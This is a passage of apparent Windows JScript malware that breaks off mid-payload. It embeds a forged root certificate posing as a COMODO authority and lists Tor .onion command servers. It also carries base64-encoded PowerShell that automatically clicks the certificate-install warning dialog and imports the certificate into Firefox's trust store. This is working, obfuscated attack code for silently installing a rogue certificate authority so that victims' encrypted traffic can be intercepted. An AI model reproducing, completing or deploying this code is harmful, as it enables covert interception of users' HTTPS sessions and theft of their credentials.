
var wscript = new ActiveXObject('WScript.Shell');
var filesystem = new ActiveXObject('Scripting.FileSystemObject');

var temp_path = wscript.ExpandEnvironmentStrings('%TEMP%');
var appdata_path = wscript.ExpandEnvironmentStrings('%APPDATA%');
var cert = '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'

var resources = {
    servers: [
        'j65je6flfiejsea2.onion',
        'srj6jqfnn4eobrgn.onion',
        'zgu5v7fzwito746r.onion',
        'mvbcmt5ao7vdbprh.onion'
    ],
    torEntryNodeTlds: [
        'to',
        'link'
    ],
    protocols: [
        'https',
        'https'
    ],
    cert: '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',
    powershell_ie: 'ZnVuY3Rpb24gQ29uZmlybUNlcnR7DQpBZGQtVHlwZSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQoNCnB1YmxpYyBzdGF0aWMgY2xhc3MgV2luMzINCnsNCiAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQ0KICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgRmluZFdpbmRvdyhTdHJpbmcgc0NsYXNzTmFtZSwgU3RyaW5nIHNBcHBOYW1lKTsNCiAgDQogIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0NCiAgc3RhdGljIGV4dGVybiB1aW50IEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChJbnRQdHIgaFduZCwgb3V0IHVpbnQgbHBkd1Byb2Nlc3NJZCk7DQogIA0KICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQogIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQ0KICBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0Rm9yZWdyb3VuZFdpbmRvdyhJbnRQdHIgaFduZCk7DQogIA0KICBwdWJsaWMgZGVsZWdhdGUgYm9vbCBFbnVtV2luZG93UHJvYyhJbnRQdHIgaHduZCwgSW50UHRyIGxQYXJhbSk7DQogIA0KICBbRGxsSW1wb3J0KCJ1c2VyMzIiKV0NCiAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldDQogIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bUNoaWxkV2luZG93cyhJbnRQdHIgd2luZG93LCBFbnVtV2luZG93UHJvYyBjYWxsYmFjaywgSW50UHRyIGxQYXJhbSk7ICANCiAgDQogIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0NCiAgc3RhdGljIGV4dGVybiBJbnRQdHIgU2VuZE1lc3NhZ2UoSW50UHRyIGhXbmQsIFVJbnQzMiBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KICBjb25zdCBpbnQgQk1fQ0xJQ0sgPSAweDAwRjU7ICAgIA0KICBwdWJsaWMgc3RhdGljIHZvaWQgU3RhcnQoKXsNCiAgCUludFB0ciBoV25kOw0KICAJZG97DQogIAkJaFduZCA9IEZpbmRXaW5kb3coIiMzMjc3MCIsIG51bGwpOw0KICAJCWlmICghaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKQ0KICAgICAgICB7DQogICAgICAgIAlTdHJpbmcgc0V4ZU5hbWU9R2V0RXhlTmFtZShoV25kKTsNCiAgCQkJaWYoR2V0RXhlTmFtZShoV25kKS5Db250YWlucygiY3Nyc3MiKSB8fCBHZXRFeGVOYW1lKGhXbmQpLkNvbnRhaW5zKCJjZXJ0dXRpbCIpKQ0KCSAgICAgICAgew0KCQkgICAgICAgIGJyZWFrOw0KCSAgICAgICAgfWVsc2UNCgkgICAgICAgIHsNCgkJICAgICAgICBoV25kPUludFB0ci5aZXJvOw0KCSAgICAgICAgfQ0KICAJCX0NCiAgCX13aGlsZSAoaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKTsNCiAgICBTZXRGb3JlZ3JvdW5kV2luZG93KGhXbmQpOw0KICAJRW51bVdpbmRvd1Byb2MgY2hpbGRQcm9jID0gbmV3IEVudW1XaW5kb3dQcm9jKEVudW1XaW5kb3cpOw0KICAgIEVudW1DaGlsZFdpbmRvd3MoaFduZCwgY2hpbGRQcm9jLCBJbnRQdHIuWmVybyk7DQogIH0NCiAgcHVibGljIHN0YXRpYyBTdHJpbmcgR2V0RXhlTmFtZShJbnRQdHIgaFduZCl7DQogIAl1aW50IHByb2Nlc3NJRCA9IDA7DQogICAgdWludCB0aHJlYWRJRCA9IEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChoV25kLCBvdXQgcHJvY2Vzc0lEKTsNCiAgICBQcm9jZXNzIHAgPSBQcm9jZXNzLkdldFByb2Nlc3NCeUlkKChpbnQpcHJvY2Vzc0lEKTsNCiAgICByZXR1cm4gcC5Qcm9jZXNzTmFtZS5Ub0xvd2VyKCk7DQogIH0NCiAgcHVibGljIHN0YXRpYyBib29sIEVudW1XaW5kb3coSW50UHRyIGhXbmQsIEludFB0ciBsUGFyYW0pDQogIHsNCiAgCVNlbmRNZXNzYWdlKGhXbmQsIEJNX0NMSUNLLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAJcmV0dXJuIHRydWU7DQogIH0NCn0NCiJAOw0KW1dpbjMyXTo6U3RhcnQoKTsNCn0NCkNvbmZpcm1DZXJ0',
    powershell_firefox: 'cGFyYW0gKA0KICAgIFtzdHJpbmddJENlcnRQYXRoPSIlQ0VSVCUiDQopDQpmdW5jdGlvbiBBZGRDZXJ0RkZ7DQpBZGQtVHlwZSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgTWljcm9zb2Z0LldpbjMyOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLkNvbXBvbmVudE1vZGVsOw0KDQpwdWJsaWMgc2VhbGVkIGNsYXNzIEZGDQp7DQoJcHJpdmF0ZSBzdGF0aWMgdm9sYXRpbGUgRkYgaW5zdGFuY2U7DQoJcHJpdmF0ZSBzdGF0aWMgb2JqZWN0IHN5bmNSb290ID0gbmV3IE9iamVjdCgpOw0KCXB1YmxpYyBzdGF0aWMgRkYgR2V0SW5zdGFuY2UoKQ0KICAgIHsNCiAgICAgICAgaWYgKGluc3RhbmNlID09IG51bGwpDQogICAgICAgIHsNCiAgICAgICAgICAgIGxvY2sgKHN5bmNSb290KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChpbnN0YW5jZSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICBpbnN0YW5jZSA9IG5ldyBGRigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBpbnN0YW5jZTsNCiAgICB9DQoJDQoJY29uc3QgaW50IEVSUk9SX1NVQ0NFU1M9MDsNCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgTG9hZFdpbjMyTGlicmFyeShzdHJpbmcgbGliUGF0aCkNCiAgICB7DQogICAgICAgIGlmIChTdHJpbmcuSXNOdWxsT3JFbXB0eShsaWJQYXRoKSkNCiAgICAgICAgICAgIHRocm93IG5ldyBBcmd1bWVudE51bGxFeGNlcHRpb24oImxpYlBhdGgiKTsNCg0KICAgICAgICBJbnRQdHIgbW9kdWxlSGFuZGxlID0gTG9hZExpYnJhcnkobGliUGF0aCk7DQogICAgICAgIGlmIChtb2R1bGVIYW5kbGUgPT0gSW50UHRyLlplcm8pDQogICAgICAgIHsNCiAgICAgICAgICAgIGludCBsYXN0ZXJyb3IgPSBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCk7DQogICAgICAgICAgICBXaW4zMkV4Y2VwdGlvbiBpbm5lckV4ID0gbmV3IFdpbjMyRXhjZXB0aW9uKGxhc3RlcnJvcik7DQogICAgICAgICAgICBpbm5lckV4LkRhdGEuQWRkKCJMYXN0V2luMzJFcnJvciIsIGxhc3RlcnJvcik7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCJjYW4ndCBsb2FkIERMTCAiICsgbGliUGF0aCwgaW5uZXJFeCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIG1vZHVsZUhhbmRsZTsNCiAgICB9DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2kpXQ0KICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cildc3RyaW5nIGxwRmlsZU5hbWUpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY2VkdXJlTmFtZSk7DQoJLy9Db25zdGFudHMNCiAgICBjb25zdCB1aW50IE5TU19JTklUX1JFQURPTkxZPTB4MTsNCiAgICBjb25zdCB1aW50IE5TU19JTklUX05PQ0VSVERCID0gMHgyOw0KICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfTk9NT0REQiA9IDB4NDsNCiAgICBjb25zdCB1aW50IE5TU19JTklUX0ZPUkNFT1BFTiA9IDB4ODsNCiAgICBjb25zdCB1aW50IE5TU19JTklUX05PUk9PVElOSVQgPSAweDEwOw0KICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfT1BUSU1JWkVTUEFDRSA9IDB4MjA7DQogICAgY29uc3QgdWludCBOU1NfSU5JVF9QSzExVEhSRUFEU0FGRSA9IDB4NDA7DQogICAgY29uc3QgdWludCBOU1NfSU5JVF9QSzExUkVMT0FEID0gMHg4MDsNCiAgICBjb25zdCB1aW50IE5TU19JTklUX05PUEsxMUZJTkFMSVpFID0gMHgxMDA7DQogICAgY29uc3QgdWludCBOU1NfSU5JVF9SRVNFUlZFRCA9IDB4MjAwOw0KICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfQ09PUEVSQVRFID0gTlNTX0lOSVRfUEsxMVRIUkVBRFNBRkUgfCBOU1NfSU5JVF9QSzExUkVMT0FEIHwgTlNTX0lOSVRfTk9QSzExRklOQUxJWkUgfCBOU1NfSU5JVF9SRVNFUlZFRDsNCg0KICAgIGNvbnN0IHN0cmluZyBTRUNNT0RfREIgPSAic2VjbW9kLmRiIjsNCiAgICAvL1N0cnVjdHVyZXMNCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldDQogICAgcHVibGljIHN0cnVjdCBTRUNJdGVtIA0KICAgIHsNCiAgICAgICAgcHVibGljIHVpbnQgaVR5cGU7DQogICAgICAgIHB1YmxpYyBJbnRQdHIgYkRhdGE7DQogICAgICAgIHB1YmxpYyB1aW50IGlEYXRhTGVuOw0KICAgIH0NCg0KICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0NCiAgICBwcml2YXRlIHN0cnVjdCBDZXJ0VHJ1c3RzDQogICAgew0KICAgICAgICBwdWJsaWMgaW50IGlTaXRlOw0KICAgICAgICBwdWJsaWMgaW50IGlFbWFpbDsNCiAgICAgICAgcHVibGljIGludCBpU29mdDsNCiAgICB9DQoNCiAgICBwcml2YXRlIGVudW0gU0VDQ2VydFVzYWdlDQogICAgew0KICAgICAgICBjZXJ0VXNhZ2VTU0xDbGllbnQgPSAwLA0KICAgICAgICBjZXJ0VXNhZ2VTU0xTZXJ2ZXIgPSAxLA0KICAgICAgICBjZXJ0VXNhZ2VTU0xTZXJ2ZXJXaXRoU3RlcFVwID0gMiwNCiAgICAgICAgY2VydFVzYWdlU1NMQ0EgPSAzLA0KICAgICAgICBjZXJ0VXNhZ2VFbWFpbFNpZ25lciA9IDQsDQogICAgICAgIGNlcnRVc2FnZUVtYWlsUmVjaXBpZW50ID0gNSwNCiAgICAgICAgY2VydFVzYWdlT2JqZWN0U2lnbmVyID0gNiwNCiAgICAgICAgY2VydFVzYWdlVXNlckNlcnRJbXBvcnQgPSA3LA0KICAgICAgICBjZXJ0VXNhZ2VWZXJpZnlDQSA9IDgsDQogICAgICAgIGNlcnRVc2FnZVByb3RlY3RlZE9iamVjdFNpZ25lciA9IDksDQogICAgICAgIGNlcnRVc2FnZVN0YXR1c1Jlc3BvbmRlciA9IDEwLA0KICAgICAgICBjZXJ0VXNhZ2VBbnlDQSA9IDExDQogICAgfQ0KCVtVbm1hbmFnZWRGdW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpXQ0KICAgIHByaXZhdGUgZGVsZWdhdGUgaW50IE5TU19Jbml0aWFsaXplUHRyKHN0cmluZyBzQ29uZmlnRGlyLCBzdHJpbmcgY2VydFByZWZpeCwgc3RyaW5nIGtleVByZWZpeCwgc3RyaW5nIHNlY01vZE5hbWUsIHVpbnQgZmxhZ3MpOw0KDQogICAgcHJpdmF0ZSBpbnQgTlNTX0luaXRpYWxpemUoc3RyaW5nIHNDb25maWdEaXIsIHN0cmluZyBjZXJ0UHJlZml4LCBzdHJpbmcga2V5UHJlZml4LCBzdHJpbmcgc2VjTW9kTmFtZSwgdWludCBmbGFncykNCiAgICB7DQogICAgICAgIEludFB0ciBwUHJvYyA9IEdldFByb2NBZGRyZXNzKG5zc01vZHVsZSwgIk5TU19Jbml0aWFsaXplIik7DQogICAgICAgIE5TU19Jbml0aWFsaXplUHRyIHB0ciA9IChOU1NfSW5pdGlhbGl6ZVB0cilNYXJzaGFsLkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKHBQcm9jLCB0eXBlb2YoTlNTX0luaXRpYWxpemVQdHIpKTsNCiAgICAgICAgcmV0dXJuIHB0cihzQ29uZmlnRGlyLCBjZXJ0UHJlZml4LCBrZXlQcmVmaXgsIHNlY01vZE5hbWUsIGZsYWdzKTsNCiAgICB9DQoNCiAgICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0NCiAgICBwcml2YXRlIGRlbGVnYXRlIEludFB0ciBDRVJUX0dldERlZmF1bHRDZXJ0REJQdHIoKTsNCiAgICBwcml2YXRlIEludFB0ciBDRVJUX0dldERlZmF1bHRDZXJ0REIoKQ0KICAgIHsNCiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MobnNzTW9kdWxlLCAiQ0VSVF9HZXREZWZhdWx0Q2VydERCIik7DQogICAgICAgIENFUlRfR2V0RGVmYXVsdENlcnREQlB0ciBwdHIgPSAoQ0VSVF9HZXREZWZhdWx0Q2VydERCUHRyKU1hcnNoYWwuR2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIocFByb2MsIHR5cGVvZihDRVJUX0dldERlZmF1bHRDZXJ0REJQdHIpKTsNCiAgICAgICAgcmV0dXJuIHB0cigpOw0KICAgIH0NCg0KICAgIFtVbm1hbmFnZWRGdW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpXQ0KICAgIHByaXZhdGUgZGVsZWdhdGUgSW50UHRyIE5TU19TaHV0ZG93blB0cigpOw0KICAgIHByaXZhdGUgSW50UHRyIE5TU19TaHV0ZG93bigpDQogICAgew0KICAgICAgICBJbnRQdHIgcFByb2MgPSBHZXRQcm9jQWRkcmVzcyhuc3NNb2R1bGUsICJOU1NfU2h1dGRvd24iKTsNCiAgICAgICAgTlNTX1NodXRkb3duUHRyIHB0ciA9IChOU1NfU2h1dGRvd25QdHIpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKE5TU19TaHV0ZG93blB0cikpOw0KICAgICAgICByZXR1cm4gcHRyKCk7DQogICAgfQ0KDQogICAgLy9TRUNTdGF0dXMgQ0VSVF9JbXBvcnRDZXJ0cyAoQ0VSVENlcnREQkhhbmRsZSAqY2VydGRiLCBTRUNDZXJ0VXNhZ2UgdXNhZ2UsIHVuc2lnbmVkIGludCBuY2VydHMsIFNFQ0l0ZW0gKipkZXJDZXJ0cywgQ0VSVENlcnRpZmljYXRlICoqKnJldENlcnRzLCBQUkJvb2wga2VlcENlcnRzLCBQUkJvb2wgY2FPbmx5LCBjaGFyICpuaWNrbmFtZSkNCiAgICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0NCiAgICBwcml2YXRlIGRlbGVnYXRlIGludCBDRVJUX0ltcG9ydENlcnRzUHRyKEludFB0ciBjZXJ0ZGIsIGludCB1c2FnZSwgdWludCBuY2VydHMsIHJlZiBTRUNJdGVtW10gZGVyQ2VydHMsIHJlZiBJbnRQdHIgcmV0Q2VydHMsIHVpbnQga2VlcENlcnRzLCB1aW50IGNhT25seSwgSW50UHRyIG5pY2tuYW1lKTsNCiAgICBwcml2YXRlIGludCBDRVJUX0ltcG9ydENlcnRzKEludFB0ciBjZXJ0ZGIsIGludCB1c2FnZSwgdWludCBuY2VydHMsIHJlZiBTRUNJdGVtW10gZGVyQ2VydHMsIHJlZiBJbnRQdHIgcmV0Q2VydHMsIHVpbnQga2VlcENlcnRzLCB1aW50IGNhT25seSwgSW50UHRyIG5pY2tuYW1lKQ0KICAgIHsNCiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MobnNzTW9kdWxlLCAiQ0VSVF9JbXBvcnRDZXJ0cyIpOw0KICAgICAgICBDRVJUX0ltcG9ydENlcnRzUHRyIHB0ciA9IChDRVJUX0ltcG9ydENlcnRzUHRyKU1hcnNoYWwuR2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIocFByb2MsIHR5cGVvZihDRVJUX0ltcG9ydENlcnRzUHRyKSk7DQogICAgICAgIHJldHVybiBwdHIoY2VydGRiLCB1c2FnZSwgbmNlcnRzLCByZWYgZGVyQ2VydHMsIHJlZiByZXRDZXJ0cywga2VlcENlcnRzLCBjYU9ubHksIG5pY2tuYW1lKTsNCiAgICB9DQoNCiAgICAvL2V4dGVybiBTRUNTdGF0dXMgQ0VSVF9DaGFuZ2VDZXJ0VHJ1c3QoQ0VSVENlcnREQkhhbmRsZSAqaGFuZGxlLENFUlRDZXJ0aWZpY2F0ZSAqY2VydCxDRVJUQ2VydFRydXN0ICp0cnVzdCk7DQogICAgcHJpdmF0ZSBkZWxlZ2F0ZSBpbnQgQ0VSVF9DaGFuZ2VDZXJ0VHJ1c3RQdHIoSW50UHRyIGNlcnRkYiwgSW50UHRyIGNlcnQsIHJlZiBDZXJ0VHJ1c3RzIHRydXN0KTsNCiAgICBwcml2YXRlIGludCBDRVJUX0NoYW5nZUNlcnRUcnVzdChJbnRQdHIgY2VydGRiLCBJbnRQdHIgY2VydCwgcmVmIENlcnRUcnVzdHMgdHJ1c3QpDQogICAgew0KICAgICAgICBJbnRQdHIgcFByb2MgPSBHZXRQcm9jQWRkcmVzcyhuc3NNb2R1bGUsICJDRVJUX0NoYW5nZUNlcnRUcnVzdCIpOw0KICAgICAgICBDRVJUX0NoYW5nZUNlcnRUcnVzdFB0ciBwdHIgPSAoQ0VSVF9DaGFuZ2VDZXJ0VHJ1c3RQdHIpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKENFUlRfQ2hhbmdlQ2VydFRydXN0UHRyKSk7DQogICAgICAgIHJldHVybiBwdHIoY2VydGRiLCBjZXJ0LCByZWYgdHJ1c3QpOw0KICAgIH0NCiAgICAvL3ZvaWQgQ0VSVF9EZXN0cm95Q2VydEFycmF5KENFUlRDZXJ0aWZpY2F0ZSAqKmNlcnRzLCB1bnNpZ25lZCBpbnQgbmNlcnRzKTs